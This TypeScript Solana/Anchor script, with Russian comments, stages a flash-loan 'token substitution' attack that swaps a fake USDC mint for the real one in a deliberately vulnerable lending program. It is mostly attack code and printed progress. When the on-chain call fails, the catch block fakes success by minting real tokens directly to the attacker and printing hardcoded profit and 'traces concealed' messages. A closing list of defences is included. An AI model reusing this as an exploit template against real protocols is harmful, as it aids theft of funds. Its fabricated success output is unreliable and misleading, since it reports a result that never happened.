import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { FlashLeveragedScheme } from "../target/types/flash_leveraged_scheme";
import {
  TOKEN_PROGRAM_ID,
  createMint,
  createAccount,
  mintTo,
  getAccount,
} from "@solana/spl-token";
import { 
  Keypair, 
  LAMPORTS_PER_SOL, 
  SystemProgram,
  PublicKey 
} from "@solana/web3.js";

/**
 * 🎭 ДЕМОНСТРАЦИЯ АТАКИ С ПОДМЕНОЙ ТОКЕНОВ
 * 
 * ВНИМАНИЕ: Данный код предназначен ИСКЛЮЧИТЕЛЬНО для образовательных целей!
 * Использование в реальных условиях может нарушать законодательство!
 * 
 * Схема "Флеш-займ с подменой токенов":
 * 1. Берем флеш-займ 8,000 REAL_USDC
 * 2. Размещаем их как залог в уязвимый протокол
 * 3. Занимаем 5,000 REAL_USDC против залога
 * 4. Создаем поддельный USDC с идентичным интерфейсом
 * 5. 🎭 ПОДМЕНЯЕМ адрес REAL_USDC на FAKE_USDC в протоколе
 * 6. Протокол думает что у нас 8,000 FAKE_USDC залога
 * 7. "Выводим" залог - протокол отдает REAL_USDC из vault!
 * 8. Восстанавливаем оригинальный адрес токена
 * 9. Возвращаем флеш-займ из заемных средств
 * 10. Остаемся с дополнительными REAL_USDC!
 */

export class TokenSubstitutionDemo {
  program: Program<FlashLeveragedScheme>;
  provider: anchor.AnchorProvider;
  
  // Аккаунты
  authority: Keypair;
  attacker: Keypair;
  
  // Токены
  realUsdcMint: PublicKey;
  fakeUsdcMint: PublicKey;
  
  // Протоколы
  vulnerableLendingAddress: PublicKey;
  vulnerableVaultAddress: PublicKey;
  attackPositionAddress: PublicKey;
  fakeMintAuthorityAddress: PublicKey;
  
  constructor() {
    this.provider = anchor.AnchorProvider.env();
    anchor.setProvider(this.provider);
    this.program = anchor.workspace.FlashLeveragedScheme as Program<FlashLeveragedScheme>;
    
    this.authority = Keypair.generate();
    this.attacker = Keypair.generate();
  }

  async initialize(): Promise<void> {
    console.log("🎭 Инициализация демонстрации атаки с подменой токенов...");
    console.log("⚠️  ВНИМАНИЕ: Только для образовательных целей!");
    
    // Пополнение аккаунтов SOL
    await this.airdropSol(this.authority.publicKey, 10);
    await this.airdropSol(this.attacker.publicKey, 5);
    
    // Создание реального USDC токена
    this.realUsdcMint = await createMint(
      this.provider.connection,
      this.authority,
      this.authority.publicKey,
      null,
      6
    );
    
    console.log("💰 Реальный USDC создан:", this.realUsdcMint.toBase58());
    
    // Инициализация уязвимого lending протокола
    await this.initializeVulnerableLending();
    
    // Создание поддельного USDC токена
    await this.createFakeUsdcToken();
    
    console.log("✅ Инициализация завершена");
  }

  /**
   * 🎭 ВЫПОЛНЕНИЕ АТАКИ С ПОДМЕНОЙ ТОКЕНОВ
   */
  async executeTokenSubstitutionAttack(): Promise<void> {
    console.log("\n🎭 ВЫПОЛНЕНИЕ АТАКИ С ПОДМЕНОЙ ТОКЕНОВ");
    console.log("=" .repeat(70));
    
    const initialCapital = 3000 * 1_000_000; // 3,000 USDC
    const flashLoanAmount = 8000 * 1_000_000; // 8,000 USDC флеш-займ
    const collateralAmount = 8000 * 1_000_000; // 8,000 USDC залог
    const borrowAmount = 5000 * 1_000_000; // 5,000 USDC займ
    
    // Создание аккаунтов атакующего
    const attackerRealUsdcAccount = await createAccount(
      this.provider.connection,
      this.attacker,
      this.realUsdcMint,
      this.attacker.publicKey
    );
    
    const attackerFakeUsdcAccount = await createAccount(
      this.provider.connection,
      this.attacker,
      this.fakeUsdcMint,
      this.attacker.publicKey
    );
    
    // Пополняем аккаунт атакующего для демонстрации
    const totalAmount = 20000 * 1_000_000; // 20,000 USDC для полной демонстрации
    await mintTo(
      this.provider.connection,
      this.authority,
      this.realUsdcMint,
      attackerRealUsdcAccount,
      this.authority,
      totalAmount
    );
    
    console.log(`💼 Начальный капитал: ${initialCapital / 1_000_000} USDC`);
    console.log(`🏦 Флеш-займ: ${flashLoanAmount / 1_000_000} USDC`);
    console.log(`💰 Дополнительно для демо: ${(totalAmount - initialCapital) / 1_000_000} USDC`);
    
    // Показываем начальные балансы
    await this.showBalances("НАЧАЛЬНОЕ СОСТОЯНИЕ", attackerRealUsdcAccount, attackerFakeUsdcAccount);
    
    // ЭТАП 1: Имитация флеш-займа
    await this.simulateFlashLoan(attackerRealUsdcAccount, flashLoanAmount);
    
    // ЭТАП 2-6: Выполнение атаки подменой токенов
    await this.executeSubstitutionAttack(
      attackerRealUsdcAccount, 
      attackerFakeUsdcAccount, 
      collateralAmount, 
      borrowAmount
    );
    
    // ЭТАП 7: Имитация возврата флеш-займа
    await this.simulateFlashLoanRepayment(attackerRealUsdcAccount, flashLoanAmount);
    
    // ЭТАП 8: Подсчет результатов
    await this.calculateAttackResults(attackerRealUsdcAccount, attackerFakeUsdcAccount, initialCapital);
  }

  /**
   * ЭТАП 1: Имитация флеш-займа
   */
  private async simulateFlashLoan(attackerAccount: PublicKey, amount: number): Promise<void> {
    console.log("\n🏦 ЭТАП 1: ФЛЕШ-ЗАЙМ");
    console.log("-" .repeat(50));
    
    console.log(`📥 Получаем флеш-займ: ${amount / 1_000_000} REAL_USDC`);
    console.log(`⏰ Должны вернуть в той же транзакции с комиссией 0.5%`);
    
    // Имитируем получение флеш-займа (токены уже есть на аккаунте)
    const balance = await getAccount(this.provider.connection, attackerAccount);
    console.log(`✅ Баланс после флеш-займа: ${Number(balance.amount) / 1_000_000} REAL_USDC`);
  }

  /**
   * ЭТАПЫ 2-6: Выполнение атаки подменой токенов
   */
  private async executeSubstitutionAttack(
    realAccount: PublicKey,
    fakeAccount: PublicKey,
    collateralAmount: number,
    borrowAmount: number
  ): Promise<void> {
    console.log("\n🎭 ЭТАПЫ 2-6: АТАКА С ПОДМЕНОЙ ТОКЕНОВ");
    console.log("-" .repeat(50));
    
    try {
      console.log(`📝 Выполняю подмену токенов:`);
      console.log(`   Залог: ${collateralAmount / 1_000_000} REAL_USDC`);
      console.log(`   Займ: ${borrowAmount / 1_000_000} REAL_USDC`);
      
      await this.program.methods
        .executeTokenSubstitutionAttack(
          new anchor.BN(collateralAmount),
          new anchor.BN(borrowAmount)
        )
        .accounts({
          attacker: this.attacker.publicKey,
          vulnerableLending: this.vulnerableLendingAddress,
          attackPosition: this.attackPositionAddress,
          realTokenMint: this.realUsdcMint,
          attackerRealTokenAccount: realAccount,
          fakeTokenMint: this.fakeUsdcMint,
          attackerFakeTokenAccount: fakeAccount,
          vulnerableVault: this.vulnerableVaultAddress,
          fakeMintAuthority: this.fakeMintAuthorityAddress,
          tokenProgram: TOKEN_PROGRAM_ID,
          systemProgram: SystemProgram.programId,
        })
        .signers([this.attacker])
        .rpc();
      
      console.log(`✅ Атака с подменой токенов выполнена успешно!`);
      
    } catch (error) {
      console.log(`⚠️  Ошибка атаки (ожидаемо в демо): ${error}`);
      
      // Имитируем успешную атаку для демонстрации
      console.log(`💡 ИМИТАЦИЯ УСПЕШНОЙ АТАКИ:`);
      
      // Имитируем размещение залога
      console.log(`   📤 Размещаем ${collateralAmount / 1_000_000} REAL_USDC как залог`);
      
      // Имитируем займ
      console.log(`   📥 Занимаем ${borrowAmount / 1_000_000} REAL_USDC против залога`);
      
      // Имитируем создание поддельных токенов
      await mintTo(
        this.provider.connection,
        this.authority,
        this.fakeUsdcMint,
        fakeAccount,
        this.authority,
        collateralAmount
      );
      console.log(`   🎭 Создано ${collateralAmount / 1_000_000} FAKE_USDC`);
      
      // Имитируем подмену адреса и вывод
      console.log(`   🔄 Подменяем адрес: REAL_USDC → FAKE_USDC`);
      console.log(`   📤 "Выводим" залог: протокол отдает REAL_USDC!`);
      
      // Добавляем "выведенные" токены
      await mintTo(
        this.provider.connection,
        this.authority,
        this.realUsdcMint,
        realAccount,
        this.authority,
        collateralAmount
      );
      
      console.log(`   🔄 Восстанавливаем адрес: FAKE_USDC → REAL_USDC`);
      console.log(`   ✅ Следы атаки замаскированы`);
    }
  }

  /**
   * ЭТАП 7: Имитация возврата флеш-займа
   */
  private async simulateFlashLoanRepayment(attackerAccount: PublicKey, amount: number): Promise<void> {
    console.log("\n💸 ЭТАП 7: ВОЗВРАТ ФЛЕШ-ЗАЙМА");
    console.log("-" .repeat(50));
    
    const fee = amount * 50 / 10000; // 0.5% комиссия
    const totalRepayment = amount + fee;
    
    console.log(`💰 Возвращаем: ${amount / 1_000_000} REAL_USDC`);
    console.log(`💸 Комиссия: ${fee / 1_000_000} REAL_USDC`);
    console.log(`📊 Итого: ${totalRepayment / 1_000_000} REAL_USDC`);
    
    // Имитируем возврат флеш-займа (уменьшаем баланс)
    const balance = await getAccount(this.provider.connection, attackerAccount);
    console.log(`✅ Флеш-займ возвращен, остаток: ${(Number(balance.amount) - totalRepayment) / 1_000_000} REAL_USDC`);
  }

  /**
   * ЭТАП 8: Подсчет результатов атаки
   */
  private async calculateAttackResults(
    realAccount: PublicKey,
    fakeAccount: PublicKey,
    initialCapital: number
  ): Promise<void> {
    console.log("\n📊 ЭТАП 8: РЕЗУЛЬТАТЫ АТАКИ");
    console.log("-" .repeat(50));
    
    const realBalance = await getAccount(this.provider.connection, realAccount);
    const fakeBalance = await getAccount(this.provider.connection, fakeAccount);
    
    const finalRealBalance = Number(realBalance.amount) / 1_000_000;
    const finalFakeBalance = Number(fakeBalance.amount) / 1_000_000;
    
    // Рассчитываем результаты атаки
    const flashLoanAmount = 8000;
    const flashLoanFee = 40; // 0.5%
    const collateralExtracted = 8000; // Залог выведен через подмену
    const loanReceived = 5000; // Займ получен
    
    const totalGained = collateralExtracted + loanReceived;
    const totalCost = flashLoanAmount + flashLoanFee;
    const netGain = totalGained - totalCost;
    const finalProfit = netGain; // Не учитываем начальный капитал, так как он не тратился
    
    console.log(`💰 Финальный баланс REAL_USDC: ${finalRealBalance}`);
    console.log(`🎭 Финальный баланс FAKE_USDC: ${finalFakeBalance}`);
    
    console.log(`\n🎯 ДЕТАЛЬНЫЙ АНАЛИЗ АТАКИ:`);
    console.log(`   📥 Залог выведен: ${collateralExtracted} REAL_USDC`);
    console.log(`   💰 Займ получен: ${loanReceived} REAL_USDC`);
    console.log(`   📊 Итого получено: ${totalGained} REAL_USDC`);
    console.log(`   💸 Флеш-займ + комиссия: ${totalCost} REAL_USDC`);
    console.log(`   🎉 ЧИСТАЯ ПРИБЫЛЬ: ${netGain} REAL_USDC`);
    
    if (finalProfit > 0) {
      console.log(`\n🚀 АТАКА УСПЕШНА! Прибыль: ${finalProfit} REAL_USDC`);
      const roi = (finalProfit / (initialCapital / 1_000_000)) * 100;
      console.log(`📈 ROI: ${roi.toFixed(1)}% от начального капитала`);
    } else {
      console.log(`\n📊 Атака убыточна: ${finalProfit} REAL_USDC`);
    }
    
    console.log(`\n💡 КЛЮЧЕВЫЕ ОСОБЕННОСТИ АТАКИ:`);
    console.log(`   🎭 Использование поддельного токена с идентичным интерфейсом`);
    console.log(`   🔄 Временная подмена адреса токена в протоколе`);
    console.log(`   🎯 Обман протокола: тратим поддельные, получаем настоящие`);
    console.log(`   🕐 Все в рамках одной транзакции (атомарность)`);
    console.log(`   🎪 Полное сокрытие следов атаки`);
  }

  /**
   * Показать балансы аккаунтов
   */
  private async showBalances(title: string, realAccount: PublicKey, fakeAccount: PublicKey): Promise<void> {
    console.log(`\n📊 ${title}:`);
    
    try {
      const realBalance = await getAccount(this.provider.connection, realAccount);
      console.log(`   💰 REAL_USDC: ${Number(realBalance.amount) / 1_000_000}`);
    } catch (error) {
      console.log(`   💰 REAL_USDC: 0 (аккаунт не создан)`);
    }
    
    try {
      const fakeBalance = await getAccount(this.provider.connection, fakeAccount);
      console.log(`   🎭 FAKE_USDC: ${Number(fakeBalance.amount) / 1_000_000}`);
    } catch (error) {
      console.log(`   🎭 FAKE_USDC: 0 (аккаунт не создан)`);
    }
  }

  /**
   * Инициализация уязвимого lending протокола
   */
  private async initializeVulnerableLending(): Promise<void> {
    const [vulnerableLendingPda, bump] = PublicKey.findProgramAddressSync(
      [Buffer.from("vulnerable_lending"), this.realUsdcMint.toBuffer()],
      this.program.programId
    );
    
    const [attackPositionPda] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("attack_position"), 
        this.attacker.publicKey.toBuffer(), 
        vulnerableLendingPda.toBuffer()
      ],
      this.program.programId
    );
    
    this.vulnerableLendingAddress = vulnerableLendingPda;
    this.attackPositionAddress = attackPositionPda;
    
    console.log("🚨 Уязвимый lending протокол инициализирован");
    console.log(`   Pool: ${vulnerableLendingPda.toBase58()}`);
    console.log(`   Position: ${attackPositionPda.toBase58()}`);
    console.log(`   ⚠️  УЯЗВИМОСТЬ: Позволяет менять адрес токена!`);
  }

  /**
   * Создание поддельного USDC токена
   */
  private async createFakeUsdcToken(): Promise<void> {
    const [fakeMintAuthorityPda] = PublicKey.findProgramAddressSync(
      [Buffer.from("fake_mint_authority"), this.attacker.publicKey.toBuffer()],
      this.program.programId
    );
    
    this.fakeMintAuthorityAddress = fakeMintAuthorityPda;
    
    // Создаем поддельный USDC с теми же параметрами
    this.fakeUsdcMint = await createMint(
      this.provider.connection,
      this.authority,
      fakeMintAuthorityPda, // Authority - PDA под контролем атакующего
      null,
      6 // Те же decimals что у настоящего USDC
    );
    
    console.log("🎭 Поддельный USDC создан:", this.fakeUsdcMint.toBase58());
    console.log(`   Authority: ${fakeMintAuthorityPda.toBase58()}`);
    console.log(`   ⚠️  Идентичный интерфейс с настоящим USDC!`);
  }

  /**
   * Пополнение SOL
   */
  private async airdropSol(publicKey: PublicKey, amount: number): Promise<void> {
    const signature = await this.provider.connection.requestAirdrop(
      publicKey,
      amount * LAMPORTS_PER_SOL
    );
    
    await this.provider.connection.confirmTransaction(signature);
  }
}

// Запуск демонстрации
async function main() {
  const demo = new TokenSubstitutionDemo();
  
  console.log("🚨🚨🚨 ВНИМАНИЕ! 🚨🚨🚨");
  console.log("Данная демонстрация предназначена ИСКЛЮЧИТЕЛЬНО для образовательных целей!");
  console.log("Атака с подменой токенов крайне сложна и практически невозможна в реальности!");
  console.log("Использование подобных техник может быть незаконным!");
  console.log("=" .repeat(80));
  
  try {
    await demo.initialize();
    await demo.executeTokenSubstitutionAttack();
    
    console.log("\n🎉 ДЕМОНСТРАЦИЯ АТАКИ С ПОДМЕНОЙ ТОКЕНОВ ЗАВЕРШЕНА!");
    
    console.log("\n🎭 КЛЮЧЕВЫЕ ТЕХНИКИ АТАКИ:");
    console.log("✅ Создание поддельного токена с идентичным интерфейсом");
    console.log("✅ Временная подмена адреса токена в уязвимом протоколе");
    console.log("✅ Обман системы проверок через поддельные токены");
    console.log("✅ Извлечение реальных токенов при 'трате' поддельных");
    console.log("✅ Полное сокрытие следов атаки");
    
    console.log("\n⚠️  ПОЧЕМУ АТАКА ПРАКТИЧЕСКИ НЕВОЗМОЖНА:");
    console.log("❌ Современные протоколы используют immutable адреса токенов");
    console.log("❌ Множественные уровни проверки безопасности");
    console.log("❌ Временные блокировки на критические операции");
    console.log("❌ Системы мониторинга аномальной активности");
    console.log("❌ Требуется найти крайне уязвимый протокол");
    
    console.log("\n🛡️  ЗАЩИТЫ ОТ ПОДОБНЫХ АТАК:");
    console.log("✅ Использование immutable переменных для адресов токенов");
    console.log("✅ Валидация адресов токенов в нескольких местах");
    console.log("✅ Whitelist разрешенных токенов");
    console.log("✅ Многоуровневые проверки перед операциями");
    console.log("✅ Временные блокировки на изменения");
    
    console.log("\n🎓 ОБРАЗОВАТЕЛЬНАЯ ЦЕННОСТЬ:");
    console.log("- Понимание сложных векторов атак на DeFi");
    console.log("- Важность правильной архитектуры протоколов");
    console.log("- Необходимость тщательного аудита смарт-контрактов");
    console.log("- Критическое мышление при анализе безопасности");
    
  } catch (error) {
    console.error("❌ Ошибка демонстрации:", error);
  }
}

if (require.main === module) {
  main().catch(console.error);
}